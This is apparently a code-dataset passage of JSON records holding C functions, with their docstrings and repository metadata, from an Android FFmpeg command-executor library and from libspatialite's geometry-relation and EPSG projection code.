{"docstring": "/* Add all the streams from the given input file to the global\n * list of input streams. */\n", "func_signal": "static void add_input_streams(OptionsContext *o, AVFormatContext *ic)", "code": "{\n    int i, ret;\n\n    for (i = 0; i < ic->nb_streams; i++) {\n        AVStream *st = ic->streams[i];\n        AVCodecContext *dec = st->codec;\n        InputStream *ist = av_mallocz(sizeof(*ist));\n        char *framerate = NULL, *hwaccel = NULL, *hwaccel_device = NULL;\n        char *codec_tag = NULL;\n        char *next;\n        char *discard_str = NULL;\n        const AVOption *discard_opt = av_opt_find(dec, \"skip_frame\", NULL, 0, 0);\n\n        if (!ist)\n            exit_program(1);\n\n        GROW_ARRAY(input_streams, nb_input_streams);\n        input_streams[nb_input_streams - 1] = ist;\n\n        ist->st = st;\n        ist->file_index = nb_input_files;\n        ist->discard = 1;\n        st->discard  = AVDISCARD_ALL;\n\n        ist->ts_scale = 1.0;\n        MATCH_PER_STREAM_OPT(ts_scale, dbl, ist->ts_scale, ic, st);\n\n        MATCH_PER_STREAM_OPT(codec_tags, str, codec_tag, ic, st);\n        if (codec_tag) {\n            uint32_t tag = strtol(codec_tag, &next, 0);\n            if (*next)\n                tag = AV_RL32(codec_tag);\n            st->codec->codec_tag = tag;\n        }\n\n        ist->dec = choose_decoder(o, ic, st);\n        ist->decoder_opts = filter_codec_opts(o->g->codec_opts, ist->st->codec->codec_id, ic, st, ist->dec);\n\n        ist->reinit_filters = -1;\n        MATCH_PER_STREAM_OPT(reinit_filters, i, ist->reinit_filters, ic, st);\n\n        MATCH_PER_STREAM_OPT(discard, str, discard_str, ic, st);\n        ist->user_set_discard = AVDISCARD_NONE;\n        if (discard_str && av_opt_eval_int(dec, discard_opt, discard_str, &ist->user_set_discard) < 0) {\n            av_log(NULL, AV_LOG_ERROR, \"Error parsing discard %s.\\n\",\n                    discard_str);\n            exit_program(1);\n        }\n\n        ist->filter_in_rescale_delta_last = AV_NOPTS_VALUE;\n\n        ist->dec_ctx = avcodec_alloc_context3(ist->dec);\n        if (!ist->dec_ctx) {\n            av_log(NULL, AV_LOG_ERROR, \"Error allocating the decoder context.\\n\");\n            exit_program(1);\n        }\n\n        ret = avcodec_copy_context(ist->dec_ctx, dec);\n        if (ret < 0) {\n            av_log(NULL, AV_LOG_ERROR, \"Error initializing the decoder context.\\n\");\n            exit_program(1);\n        }\n\n        switch (dec->codec_type) {\n        case AVMEDIA_TYPE_VIDEO:\n            if(!ist->dec)\n                ist->dec = avcodec_find_decoder(dec->codec_id);\n            if (av_codec_get_lowres(dec)) {\n                dec->flags |= CODEC_FLAG_EMU_EDGE;\n            }\n\n            ist->resample_height  = ist->dec_ctx->height;\n            ist->resample_width   = ist->dec_ctx->width;\n            ist->resample_pix_fmt = ist->dec_ctx->pix_fmt;\n\n            MATCH_PER_STREAM_OPT(frame_rates, str, framerate, ic, st);\n            if (framerate && av_parse_video_rate(&ist->framerate,\n                                                 framerate) < 0) {\n                av_log(NULL, AV_LOG_ERROR, \"Error parsing framerate %s.\\n\",\n                       framerate);\n                exit_program(1);\n            }\n\n            ist->top_field_first = -1;\n            MATCH_PER_STREAM_OPT(top_field_first, i, ist->top_field_first, ic, st);\n\n            MATCH_PER_STREAM_OPT(hwaccels, str, hwaccel, ic, st);\n            if (hwaccel) {\n                if (!strcmp(hwaccel, \"none\"))\n                    ist->hwaccel_id = HWACCEL_NONE;\n                else if (!strcmp(hwaccel, \"auto\"))\n                    ist->hwaccel_id = HWACCEL_AUTO;\n                else {\n                    int i;\n                    for (i = 0; hwaccels[i].name; i++) {\n                        if (!strcmp(hwaccels[i].name, hwaccel)) {\n                            ist->hwaccel_id = hwaccels[i].id;\n                            break;\n                        }\n                    }\n\n                    if (!ist->hwaccel_id) {\n                        av_log(NULL, AV_LOG_FATAL, \"Unrecognized hwaccel: %s.\\n\",\n                               hwaccel);\n                        av_log(NULL, AV_LOG_FATAL, \"Supported hwaccels: \");\n                        for (i = 0; hwaccels[i].name; i++)\n                            av_log(NULL, AV_LOG_FATAL, \"%s \", hwaccels[i].name);\n                        av_log(NULL, AV_LOG_FATAL, \"\\n\");\n                        exit_program(1);\n                    }\n                }\n            }\n\n            MATCH_PER_STREAM_OPT(hwaccel_devices, str, hwaccel_device, ic, st);\n            if (hwaccel_device) {\n                ist->hwaccel_device = av_strdup(hwaccel_device);\n                if (!ist->hwaccel_device)\n                    exit_program(1);\n            }\n            ist->hwaccel_pix_fmt = AV_PIX_FMT_NONE;\n\n            break;\n        case AVMEDIA_TYPE_AUDIO:\n            ist->guess_layout_max = INT_MAX;\n            MATCH_PER_STREAM_OPT(guess_layout_max, i, ist->guess_layout_max, ic, st);\n            guess_input_channel_layout(ist);\n\n            ist->resample_sample_fmt     = ist->dec_ctx->sample_fmt;\n            ist->resample_sample_rate    = ist->dec_ctx->sample_rate;\n            ist->resample_channels       = ist->dec_ctx->channels;\n            ist->resample_channel_layout = ist->dec_ctx->channel_layout;\n\n            break;\n        case AVMEDIA_TYPE_DATA:\n        case AVMEDIA_TYPE_SUBTITLE: {\n            char *canvas_size = NULL;\n            if(!ist->dec)\n                ist->dec = avcodec_find_decoder(dec->codec_id);\n            MATCH_PER_STREAM_OPT(fix_sub_duration, i, ist->fix_sub_duration, ic, st);\n            MATCH_PER_STREAM_OPT(canvas_sizes, str, canvas_size, ic, st);\n            if (canvas_size &&\n                av_parse_video_size(&ist->dec_ctx->width, &ist->dec_ctx->height, canvas_size) < 0) {\n                av_log(NULL, AV_LOG_FATAL, \"Invalid canvas size: %s.\\n\", canvas_size);\n                exit_program(1);\n            }\n            break;\n        }\n        case AVMEDIA_TYPE_ATTACHMENT:\n        case AVMEDIA_TYPE_UNKNOWN:\n            break;\n        default:\n            abort();\n        }\n    }\n}", "path": "library\\jni\\ffmpeg_opt.c", "repo_name": "dxjia/ffmpeg-commands-executor-library", "stars": 169, "license": "apache-2.0", "language": "c", "size": 12384}
{"docstring": "/**\n * Parse a metadata specifier passed as 'arg' parameter.\n * @param arg  metadata string to parse\n * @param type metadata type is written here -- g(lobal)/s(tream)/c(hapter)/p(rogram)\n * @param index for type c/p, chapter/program index is written here\n * @param stream_spec for type s, the stream specifier is written here\n */\n", "func_signal": "static void parse_meta_type(char *arg, char *type, int *index, const char **stream_spec)", "code": "{\n    if (*arg) {\n        *type = *arg;\n        switch (*arg) {\n        case 'g':\n            break;\n        case 's':\n            if (*(++arg) && *arg != ':') {\n                av_log(NULL, AV_LOG_FATAL, \"Invalid metadata specifier %s.\\n\", arg);\n                exit_program(1);\n            }\n            *stream_spec = *arg == ':' ? arg + 1 : \"\";\n            break;\n        case 'c':\n        case 'p':\n            if (*(++arg) == ':')\n                *index = strtol(++arg, NULL, 0);\n            break;\n        default:\n            av_log(NULL, AV_LOG_FATAL, \"Invalid metadata type %c.\\n\", *arg);\n            exit_program(1);\n        }\n    } else\n        *type = 'g';\n}", "path": "library\\jni\\ffmpeg_opt.c", "repo_name": "dxjia/ffmpeg-commands-executor-library", "stars": 169, "license": "apache-2.0", "language": "c", "size": 12384}
{"docstring": "/*\n * Add an option instance to currently parsed group.\n */\n", "func_signal": "static void add_opt(OptionParseContext *octx, const OptionDef *opt,\n                    const char *key, const char *val)", "code": "{\n    int global = !(opt->flags & (OPT_PERFILE | OPT_SPEC | OPT_OFFSET));\n    OptionGroup *g = global ? &octx->global_opts : &octx->cur_group;\n\n    GROW_ARRAY(g->opts, g->nb_opts);\n    g->opts[g->nb_opts - 1].opt = opt;\n    g->opts[g->nb_opts - 1].key = key;\n    g->opts[g->nb_opts - 1].val = val;\n}", "path": "library\\jni\\cmdutils.c", "repo_name": "dxjia/ffmpeg-commands-executor-library", "stars": 169, "license": "apache-2.0", "language": "c", "size": 12384}
{"docstring": "/*\n * Class:     cn_dxjia_ffmpeg_library_FFmpegNativeHelper\n * Method:    ffmpeg_run\n * Signature: ()I\n */\n// native function, java layer call this to run a ffmpeg command\n", "func_signal": "JNIEXPORT jstring Java_cn_dxjia_ffmpeg_library_FFmpegNativeHelper_ffmpeg_1run(\n        JNIEnv* env, jobject thiz, jobjectArray strArray)", "code": "{\n    int ret, i, pid;\n    int pipeFD[2];\n    char retBuffer[2];\n    char resultString[4096];\n\n    int argc = (*env)->GetArrayLength(env, strArray);\n\n    char ** argv = (char **)malloc(sizeof(char*)*argc);\n\n    for (i = 0; i < argc; i++) {\n        argv[i] = (*env)->GetStringUTFChars(env,\n                              (jstring)(*env)->GetObjectArrayElement(env, strArray, i), NULL);\n    }\n\n    // reset to FAIL\n    ret = 1;\n    memset(retBuffer, 0, sizeof(retBuffer));\n    memset(resultString, 0, sizeof(resultString));\n\n    pipe(pipeFD);\n\n    pid = fork();\n\n    if (pid < 0) {\n        goto done;\n    } else if (pid == 0) {\n        // in child process, do command work\n\n        close(pipeFD[0]);\n\n        init();\n\n        av_log_set_callback(log_callback);\n\n        ret = run_ffempeg_command(argc, argv);\n\n        s_task_completed = 1;\n\n        sprintf(retBuffer, \"%d\", ret);\n        write(pipeFD[1], retBuffer, sizeof(retBuffer));\n\n        char * result_record = get_record_result();\n        sprintf(resultString, \"%s\", result_record);\n\n        write(pipeFD[1], resultString, sizeof(resultString));\n\n        exit(0);\n    } else {\n        close(pipeFD[1]);\n\n        read(pipeFD[0], retBuffer, sizeof(retBuffer));\n\n        ret = (retBuffer[0] == '1') ? 1 : 0;\n        memset(resultString, 0, sizeof(resultString));\n        read(pipeFD[0], resultString, sizeof(resultString));\n    }\n\ndone:\n    for (i=0; i<argc; i++) {\n        (*env)->ReleaseStringUTFChars(env,\n                    (jstring)(*env)->GetObjectArrayElement(env, strArray, i), argv[i]);\n    }\n\n    free(argv);\n\n    //close();\n\n    if (strlen(resultString) > 0) {\n        // workaround for UTF-8 issue\n        jbyteArray array = (*env)->NewByteArray(env, sizeof(resultString));\n        (*env)->SetByteArrayRegion(env, array, 0, sizeof(resultString), resultString);\n        jstring strEncode = (*env)->NewStringUTF(env, \"UTF-8\");\n        jclass cls = (*env)->FindClass(env, \"java/lang/String\");\n        jmethodID ctor = (*env)->GetMethodID(env, cls, \"<init>\", \"([BLjava/lang/String;)V\");\n\n        jstring object = (jstring) (*env)->NewObject(env, cls, ctor, array, strEncode);\n\n        return object;\n        //return (*env)->NewStringUTF(env, resultString);\n    } else {\n        if (ret == 0 && s_task_completed == 1) {\n            return (*env)->NewStringUTF(env, \"SUCCESS\");\n        } else {\n            return (*env)->NewStringUTF(env, \"FAIL\");\n        }\n    }\n}", "path": "library\\jni\\FFmpegNativeHelper.c", "repo_name": "dxjia/ffmpeg-commands-executor-library", "stars": 169, "license": "apache-2.0", "language": "c", "size": 12384}
{"docstring": "/* arg format is \"output-stream-index:streamid-value\". */\n", "func_signal": "static int opt_streamid(void *optctx, const char *opt, const char *arg)", "code": "{\n    OptionsContext *o = optctx;\n    int idx;\n    char *p;\n    char idx_str[16];\n\n    av_strlcpy(idx_str, arg, sizeof(idx_str));\n    p = strchr(idx_str, ':');\n    if (!p) {\n        av_log(NULL, AV_LOG_FATAL,\n               \"Invalid value '%s' for option '%s', required syntax is 'index:value'\\n\",\n               arg, opt);\n        exit_program(1);\n    }\n    *p++ = '\\0';\n    idx = parse_number_or_die(opt, idx_str, OPT_INT, 0, MAX_STREAMS-1);\n    o->streamid_map = grow_array(o->streamid_map, sizeof(*o->streamid_map), &o->nb_streamid_map, idx+1);\n    o->streamid_map[idx] = parse_number_or_die(opt, p, OPT_INT, 0, INT_MAX);\n    return 0;\n}", "path": "library\\jni\\ffmpeg_opt.c", "repo_name": "dxjia/ffmpeg-commands-executor-library", "stars": 169, "license": "apache-2.0", "language": "c", "size": 12384}
{"docstring": "/* only if GEOS advanced features are enable */\n", "func_signal": "GAIAGEO_DECLARE int\ngaiaGeomCollPreparedIntersects (void *p_cache, gaiaGeomCollPtr geom1,\n\t\t\t\tunsigned char *blob1, int size1,\n\t\t\t\tgaiaGeomCollPtr geom2, unsigned char *blob2,\n\t\t\t\tint size2)", "code": "{\n/* checks if two Geometries do \"spatially intersects\" */\n    int ret;\n    struct splite_internal_cache *cache =\n\t(struct splite_internal_cache *) p_cache;\n    GEOSPreparedGeometry *gPrep;\n    GEOSGeometry *g1;\n    GEOSGeometry *g2;\n    gaiaGeomCollPtr geom;\n    if (!geom1 || !geom2)\n\treturn -1;\n    if (gaiaIsToxic (geom1) || gaiaIsToxic (geom2))\n\treturn -1;\n\n/* quick check based on MBRs comparison */\n    if (!splite_mbr_overlaps (geom1, geom2))\n\treturn 0;\n\n/* handling the internal GEOS cache */\n    if (evalGeosCache\n\t(cache, geom1, blob1, size1, geom2, blob2, size2, &gPrep, &geom))\n      {\n\t  g2 = gaiaToGeos (geom);\n\t  ret = GEOSPreparedIntersects (gPrep, g2);\n\t  GEOSGeom_destroy (g2);\n\t  return ret;\n      }\n    g1 = gaiaToGeos (geom1);\n    g2 = gaiaToGeos (geom2);\n    ret = GEOSIntersects (g1, g2);\n    GEOSGeom_destroy (g1);\n    GEOSGeom_destroy (g2);\n    return ret;\n}", "path": "AdvancedMap3D\\jni\\libspatialite-4.1.0\\src\\gaiageo\\gg_relations.c", "repo_name": "nutiteq/hellomap3d", "stars": 151, "license": "mit", "language": "c", "size": 253418}
{"docstring": "/* only if GEOS advanced features are enable */\n", "func_signal": "GAIAGEO_DECLARE int\ngaiaGeomCollPreparedContains (void *p_cache, gaiaGeomCollPtr geom1,\n\t\t\t      unsigned char *blob1, int size1,\n\t\t\t      gaiaGeomCollPtr geom2, unsigned char *blob2,\n\t\t\t      int size2)", "code": "{\n/* checks if GEOM-1 completely contains GEOM-2 */\n    int ret;\n    struct splite_internal_cache *cache =\n\t(struct splite_internal_cache *) p_cache;\n    GEOSPreparedGeometry *gPrep;\n    GEOSGeometry *g1;\n    GEOSGeometry *g2;\n    gaiaGeomCollPtr geom;\n    if (!geom1 || !geom2)\n\treturn -1;\n    if (gaiaIsToxic (geom1) || gaiaIsToxic (geom2))\n\treturn -1;\n\n/* quick check based on MBRs comparison */\n    if (!splite_mbr_contains (geom1, geom2))\n\treturn 0;\n\n/* handling the internal GEOS cache */\n    if (evalGeosCache\n\t(cache, geom1, blob1, size1, geom2, blob2, size2, &gPrep, &geom))\n      {\n\t  g2 = gaiaToGeos (geom);\n\t  if (geom == geom2)\n\t      ret = GEOSPreparedContains (gPrep, g2);\n\t  else\n\t      ret = GEOSPreparedWithin (gPrep, g2);\n\t  GEOSGeom_destroy (g2);\n\t  return ret;\n      }\n\n    g1 = gaiaToGeos (geom1);\n    g2 = gaiaToGeos (geom2);\n    ret = GEOSContains (g1, g2);\n    GEOSGeom_destroy (g1);\n    GEOSGeom_destroy (g2);\n    return ret;\n}", "path": "AdvancedMap3D\\jni\\libspatialite-4.1.0\\src\\gaiageo\\gg_relations.c", "repo_name": "nutiteq/hellomap3d", "stars": 151, "license": "mit", "language": "c", "size": 253418}
{"docstring": "/* GEOS advanced features */\n", "func_signal": "GAIAGEO_DECLARE gaiaGeomCollPtr\ngaiaOffsetCurve (gaiaGeomCollPtr geom, double radius, int points,\n\t\t int left_right)", "code": "{\n/*\n// builds a geometry that is the OffsetCurve of GEOM \n// (which is expected to be of the LINESTRING type)\n//\n*/\n    gaiaGeomCollPtr geo;\n    GEOSGeometry *g1;\n    GEOSGeometry *g2;\n    gaiaPointPtr pt;\n    gaiaLinestringPtr ln;\n    gaiaPolygonPtr pg;\n    int pts = 0;\n    int lns = 0;\n    int pgs = 0;\n    int closed = 0;\n    if (!geom)\n\treturn NULL;\n\n/* checking the input geometry for validity */\n    pt = geom->FirstPoint;\n    while (pt)\n      {\n\t  /* counting how many POINTs are there */\n\t  pts++;\n\t  pt = pt->Next;\n      }\n    ln = geom->FirstLinestring;\n    while (ln)\n      {\n\t  /* counting how many LINESTRINGs are there */\n\t  lns++;\n\t  if (gaiaIsClosed (ln))\n\t      closed++;\n\t  ln = ln->Next;\n      }\n    pg = geom->FirstPolygon;\n    while (pg)\n      {\n\t  /* counting how many POLYGON are there */\n\t  pgs++;\n\t  pg = pg->Next;\n      }\n    if (pts > 0 || pgs > 0 || lns > 1 || closed > 0)\n\treturn NULL;\n\n/* all right: this one simply is a LINESTRING */\n    geom->DeclaredType = GAIA_LINESTRING;\n\n    g1 = gaiaToGeos (geom);\n    g2 = GEOSSingleSidedBuffer (g1, radius, points, GEOSBUF_JOIN_ROUND, 5.0,\n\t\t\t\tleft_right);\n    GEOSGeom_destroy (g1);\n    if (!g2)\n\treturn NULL;\n    if (geom->DimensionModel == GAIA_XY_Z)\n\tgeo = gaiaFromGeos_XYZ (g2);\n    else if (geom->DimensionModel == GAIA_XY_M)\n\tgeo = gaiaFromGeos_XYM (g2);\n    else if (geom->DimensionModel == GAIA_XY_Z_M)\n\tgeo = gaiaFromGeos_XYZM (g2);\n    else\n\tgeo = gaiaFromGeos_XY (g2);\n    GEOSGeom_destroy (g2);\n    if (geo == NULL)\n\treturn NULL;\n    geo->Srid = geom->Srid;\n    return geo;\n}", "path": "AdvancedMap3D\\jni\\libspatialite-4.1.0\\src\\gaiageo\\gg_relations.c", "repo_name": "nutiteq/hellomap3d", "stars": 151, "license": "mit", "language": "c", "size": 253418}
{"docstring": "/* end GEOS_ADVANCED */\n", "func_signal": "GAIAGEO_DECLARE int\ngaiaGeomCollCrosses (gaiaGeomCollPtr geom1, gaiaGeomCollPtr geom2)", "code": "{\n/* checks if two Geometries do \"spatially crosses\" */\n    int ret;\n    GEOSGeometry *g1;\n    GEOSGeometry *g2;\n    if (!geom1 || !geom2)\n\treturn -1;\n    if (gaiaIsToxic (geom1) || gaiaIsToxic (geom2))\n\treturn -1;\n\n/* quick check based on MBRs comparison */\n    if (!splite_mbr_overlaps (geom1, geom2))\n\treturn 0;\n\n    g1 = gaiaToGeos (geom1);\n    g2 = gaiaToGeos (geom2);\n    ret = GEOSCrosses (g1, g2);\n    GEOSGeom_destroy (g1);\n    GEOSGeom_destroy (g2);\n    return ret;\n}", "path": "AdvancedMap3D\\jni\\libspatialite-4.1.0\\src\\gaiageo\\gg_relations.c", "repo_name": "nutiteq/hellomap3d", "stars": 151, "license": "mit", "language": "c", "size": 253418}
{"docstring": "/* liblwgeom initialization function: required by PostGIS 2.1.x */\n", "func_signal": "SPATIALITE_PRIVATE void\nsplite_lwgeom_init (void)", "code": "{\n    lwgeom_set_handlers (NULL, NULL, NULL, lwgaia_errorreporter,\n\t\t\t lwgaia_noticereporter);\n}", "path": "AdvancedMap3D\\jni\\libspatialite-4.1.0\\src\\gaiageo\\gg_lwgeom.c", "repo_name": "nutiteq/hellomap3d", "stars": 151, "license": "mit", "language": "c", "size": 253418}
{"docstring": "/* end GEOS_ADVANCED */\n", "func_signal": "GAIAGEO_DECLARE int\ngaiaGeomCollRelate (gaiaGeomCollPtr geom1, gaiaGeomCollPtr geom2,\n\t\t    const char *pattern)", "code": "{\n/* checks if if GEOM-1 and GEOM-2 have a spatial relationship as specified by the pattern Matrix */\n    int ret;\n    GEOSGeometry *g1;\n    GEOSGeometry *g2;\n    if (!geom1 || !geom2)\n\treturn -1;\n    if (gaiaIsToxic (geom1) || gaiaIsToxic (geom2))\n\treturn -1;\n    g1 = gaiaToGeos (geom1);\n    g2 = gaiaToGeos (geom2);\n    ret = GEOSRelatePattern (g1, g2, pattern);\n    GEOSGeom_destroy (g1);\n    GEOSGeom_destroy (g2);\n    if (ret == 2)\n\treturn -1;\n    return ret;\n}", "path": "AdvancedMap3D\\jni\\libspatialite-4.1.0\\src\\gaiageo\\gg_relations.c", "repo_name": "nutiteq/hellomap3d", "stars": 151, "license": "mit", "language": "c", "size": 253418}
{"docstring": "/* only if GEOS advanced features are enable */\n", "func_signal": "GAIAGEO_DECLARE int\ngaiaGeomCollPreparedDisjoint (void *p_cache, gaiaGeomCollPtr geom1,\n\t\t\t      unsigned char *blob1, int size1,\n\t\t\t      gaiaGeomCollPtr geom2, unsigned char *blob2,\n\t\t\t      int size2)", "code": "{\n/* checks if two Geometries are \"spatially disjoint\" */\n    int ret;\n    struct splite_internal_cache *cache =\n\t(struct splite_internal_cache *) p_cache;\n    GEOSPreparedGeometry *gPrep;\n    GEOSGeometry *g1;\n    GEOSGeometry *g2;\n    gaiaGeomCollPtr geom;\n    if (!geom1 || !geom2)\n\treturn -1;\n    if (gaiaIsToxic (geom1) || gaiaIsToxic (geom2))\n\treturn -1;\n\n/* quick check based on MBRs comparison */\n    if (!splite_mbr_overlaps (geom1, geom2))\n\treturn 1;\n\n/* handling the internal GEOS cache */\n    if (evalGeosCache\n\t(cache, geom1, blob1, size1, geom2, blob2, size2, &gPrep, &geom))\n      {\n\t  g2 = gaiaToGeos (geom);\n\t  ret = GEOSPreparedDisjoint (gPrep, g2);\n\t  GEOSGeom_destroy (g2);\n\t  return ret;\n      }\n\n    g1 = gaiaToGeos (geom1);\n    g2 = gaiaToGeos (geom2);\n    ret = GEOSDisjoint (g1, g2);\n    GEOSGeom_destroy (g1);\n    GEOSGeom_destroy (g2);\n    return ret;\n}", "path": "AdvancedMap3D\\jni\\libspatialite-4.1.0\\src\\gaiageo\\gg_relations.c", "repo_name": "nutiteq/hellomap3d", "stars": 151, "license": "mit", "language": "c", "size": 253418}
{"docstring": "/* full EPSG initialization enabled */\n", "func_signal": "SPATIALITE_PRIVATE void\ninitialize_epsg_17 (int filter, struct epsg_defs **first, struct epsg_defs **last)", "code": "{\n/* initializing the EPSG defs list */\n    struct epsg_defs *p;\n    p = add_epsg_def (filter, first, last, 3750, \"epsg\", 3750,\n        \"NAD83(HARN) / UTM zone 4N\");\n    add_proj4text (p, 0,\n        \"+proj=utm +zone=4 +ellps=GRS80 +towgs84=0,0,0,0,0,0,0 +u\");\n    add_proj4text (p, 1,\n        \"nits=m +no_defs\");\n    add_srs_wkt (p, 0,\n        \"PROJCS[\\\"NAD83(HARN) / UTM zone 4N\\\",GEOGCS[\\\"NAD83(HARN\");\n    add_srs_wkt (p, 1,\n        \")\\\",DATUM[\\\"NAD83_High_Accuracy_Reference_Network\\\",SPHE\");\n    add_srs_wkt (p, 2,\n        \"ROID[\\\"GRS 1980\\\",6378137,298.257222101,AUTHORITY[\\\"EPSG\");\n    add_srs_wkt (p, 3,\n        \"\\\",\\\"7019\\\"]],TOWGS84[0,0,0,0,0,0,0],AUTHORITY[\\\"EPSG\\\",\");\n    add_srs_wkt (p, 4,\n        \"\\\"6152\\\"]],PRIMEM[\\\"Greenwich\\\",0,AUTHORITY[\\\"EPSG\\\",\\\"8\");\n    add_srs_wkt (p, 5,\n        \"901\\\"]],UNIT[\\\"degree\\\",0.0174532925199433,AUTHORITY[\\\"E\");\n    add_srs_wkt (p, 6,\n        \"PSG\\\",\\\"9122\\\"]],AUTHORITY[\\\"EPSG\\\",\\\"4152\\\"]],PROJECTIO\");\n    add_srs_wkt (p, 7,\n        \"N[\\\"Transverse_Mercator\\\"],PARAMETER[\\\"latitude_of_origi\");\n    add_srs_wkt (p, 8,\n        \"n\\\",0],PARAMETER[\\\"central_meridian\\\",-159],PARAMETER[\\\"\");\n    add_srs_wkt (p, 9,\n        \"scale_factor\\\",0.9996],PARAMETER[\\\"false_easting\\\",50000\");\n    add_srs_wkt (p, 10,\n        \"0],PARAMETER[\\\"false_northing\\\",0],UNIT[\\\"metre\\\",1,AUTH\");\n    add_srs_wkt (p, 11,\n        \"ORITY[\\\"EPSG\\\",\\\"9001\\\"]],AXIS[\\\"Easting\\\",EAST],AXIS[\\\"\");\n    add_srs_wkt (p, 12,\n        \"Northing\\\",NORTH],AUTHORITY[\\\"EPSG\\\",\\\"3750\\\"]]\");\n    p = add_epsg_def (filter, first, last, 3751, \"epsg\", 3751,\n        \"NAD83(HARN) / UTM zone 5N\");\n    add_proj4text (p, 0,\n        \"+proj=utm +zone=5 +ellps=GRS80 +towgs84=0,0,0,0,0,0,0 +u\");\n    add_proj4text (p, 1,\n        \"nits=m +no_defs\");\n    add_srs_wkt (p, 0,\n        \"PROJCS[\\\"NAD83(HARN) / UTM zone 5N\\\",GEOGCS[\\\"NAD83(HARN\");\n    add_srs_wkt (p, 1,\n        \")\\\",DATUM[\\\"NAD83_High_Accuracy_Reference_Network\\\",SPHE\");\n    add_srs_wkt (p, 2,\n        \"ROID[\\\"GRS 1980\\\",6378137,298.257222101,AUTHORITY[\\\"EPSG\");\n    add_srs_wkt (p, 3,\n        \"\\\",\\\"7019\\\"]],TOWGS84[0,0,0,0,0,0,0],AUTHORITY[\\\"EPSG\\\",\");\n    add_srs_wkt (p, 4,\n        \"\\\"6152\\\"]],PRIMEM[\\\"Greenwich\\\",0,AUTHORITY[\\\"EPSG\\\",\\\"8\");\n    add_srs_wkt (p, 5,\n        \"901\\\"]],UNIT[\\\"degree\\\",0.0174532925199433,AUTHORITY[\\\"E\");\n    add_srs_wkt (p, 6,\n        \"PSG\\\",\\\"9122\\\"]],AUTHORITY[\\\"EPSG\\\",\\\"4152\\\"]],PROJECTIO\");\n    add_srs_wkt (p, 7,\n        \"N[\\\"Transverse_Mercator\\\"],PARAMETER[\\\"latitude_of_origi\");\n    add_srs_wkt (p, 8,\n        \"n\\\",0],PARAMETER[\\\"central_meridian\\\",-153],PARAMETER[\\\"\");\n    add_srs_wkt (p, 9,\n        \"scale_factor\\\",0.9996],PARAMETER[\\\"false_easting\\\",50000\");\n    add_srs_wkt (p, 10,\n        \"0],PARAMETER[\\\"false_northing\\\",0],UNIT[\\\"metre\\\",1,AUTH\");\n    add_srs_wkt (p, 11,\n        \"ORITY[\\\"EPSG\\\",\\\"9001\\\"]],AXIS[\\\"Easting\\\",EAST],AXIS[\\\"\");\n    add_srs_wkt (p, 12,\n        \"Northing\\\",NORTH],AUTHORITY[\\\"EPSG\\\",\\\"3751\\\"]]\");\n    p = add_epsg_def (filter, first, last, 3752, \"epsg\", 3752,\n        \"WGS 84 / Mercator 41 (deprecated)\");\n    add_proj4text (p, 0,\n        \"+proj=merc +lon_0=100 +lat_ts=-41 +x_0=0 +y_0=0 +datum=W\");\n    add_proj4text (p, 1,\n        \"GS84 +units=m +no_defs\");\n    add_srs_wkt (p, 0,\n        \"PROJCS[\\\"WGS 84 / Mercator 41 (deprecated)\\\",GEOGCS[\\\"WG\");\n    add_srs_wkt (p, 1,\n        \"S 84\\\",DATUM[\\\"WGS_1984\\\",SPHEROID[\\\"WGS 84\\\",6378137,29\");\n    add_srs_wkt (p, 2,\n        \"8.257223563,AUTHORITY[\\\"EPSG\\\",\\\"7030\\\"]],AUTHORITY[\\\"EP\");\n    add_srs_wkt (p, 3,\n        \"SG\\\",\\\"6326\\\"]],PRIMEM[\\\"Greenwich\\\",0,AUTHORITY[\\\"EPSG\\\"\");\n    add_srs_wkt (p, 4,\n        \",\\\"8901\\\"]],UNIT[\\\"degree\\\",0.0174532925199433,AUTHORITY\");\n    add_srs_wkt (p, 5,\n        \"[\\\"EPSG\\\",\\\"9122\\\"]],AUTHORITY[\\\"EPSG\\\",\\\"4326\\\"]],PROJE\");\n    add_srs_wkt (p, 6,\n        \"CTION[\\\"Mercator_1SP\\\"],PARAMETER[\\\"latitude_of_origin\\\"\");\n    add_srs_wkt (p, 7,\n        \",-41],PARAMETER[\\\"central_meridian\\\",100],PARAMETER[\\\"sc\");\n    add_srs_wkt (p, 8,\n        \"ale_factor\\\",1],PARAMETER[\\\"false_easting\\\",0],PARAMETER\");\n    add_srs_wkt (p, 9,\n        \"[\\\"false_northing\\\",0],UNIT[\\\"metre\\\",1,AUTHORITY[\\\"EPSG\");\n    add_srs_wkt (p, 10,\n        \"\\\",\\\"9001\\\"]],AXIS[\\\"X\\\",EAST],AXIS[\\\"Y\\\",NORTH],AUTHORI\");\n    add_srs_wkt (p, 11,\n        \"TY[\\\"EPSG\\\",\\\"3752\\\"]]\");\n    p = add_epsg_def (filter, first, last, 3753, \"epsg\", 3753,\n        \"NAD83(HARN) / Ohio North (ftUS)\");\n    add_proj4text (p, 0,\n        \"+proj=lcc +lat_1=41.7 +lat_2=40.43333333333333 +lat_0=39\");\n    add_proj4text (p, 1,\n        \".66666666666666 +lon_0=-82.5 +x_0=600000 +y_0=0 +ellps=G\");\n    add_proj4text (p, 2,\n        \"RS80 +towgs84=0,0,0,0,0,0,0 +units=us-ft +no_defs\");\n    add_srs_wkt (p, 0,\n        \"PROJCS[\\\"NAD83(HARN) / Ohio North (ftUS)\\\",GEOGCS[\\\"NAD8\");\n    add_srs_wkt (p, 1,\n        \"3(HARN)\\\",DATUM[\\\"NAD83_High_Accuracy_Reference_Network\\\"\");\n    add_srs_wkt (p, 2,\n        \",SPHEROID[\\\"GRS 1980\\\",6378137,298.257222101,AUTHORITY[\\\"\");\n    add_srs_wkt (p, 3,\n        \"EPSG\\\",\\\"7019\\\"]],TOWGS84[0,0,0,0,0,0,0],AUTHORITY[\\\"EPS\");\n    add_srs_wkt (p, 4,\n        \"G\\\",\\\"6152\\\"]],PRIMEM[\\\"Greenwich\\\",0,AUTHORITY[\\\"EPSG\\\"\");\n    add_srs_wkt (p, 5,\n        \",\\\"8901\\\"]],UNIT[\\\"degree\\\",0.0174532925199433,AUTHORITY\");\n    add_srs_wkt (p, 6,\n        \"[\\\"EPSG\\\",\\\"9122\\\"]],AUTHORITY[\\\"EPSG\\\",\\\"4152\\\"]],PROJE\");\n    add_srs_wkt (p, 7,\n        \"CTION[\\\"Lambert_Conformal_Conic_2SP\\\"],PARAMETER[\\\"stand\");\n    add_srs_wkt (p, 8,\n        \"ard_parallel_1\\\",41.7],PARAMETER[\\\"standard_parallel_2\\\"\");\n    add_srs_wkt (p, 9,\n        \",40.43333333333333],PARAMETER[\\\"latitude_of_origin\\\",39.\");\n    add_srs_wkt (p, 10,\n        